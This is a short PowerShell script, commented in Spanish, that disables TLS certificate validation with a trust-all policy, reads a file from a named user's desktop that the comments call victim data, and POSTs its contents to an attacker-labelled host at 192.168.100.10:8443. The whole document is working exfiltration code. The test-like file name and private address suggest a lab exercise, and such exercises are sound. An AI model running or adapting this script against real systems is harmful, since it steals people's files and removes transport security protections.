# Deshabilitar validación SSL (necesario en PowerShell 5.1)
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {
    public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) {
        return true;
    }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

# Datos de la víctima a exfiltrar
$File = "C:\Users\roman.gomez\Desktop\testing.txt"
$URL = "https://192.168.100.10:8443"

# Leer archivo y enviarlo al atacante
$Content = Get-Content $File -Raw
Invoke-RestMethod -Uri $URL -Method POST -Body $Content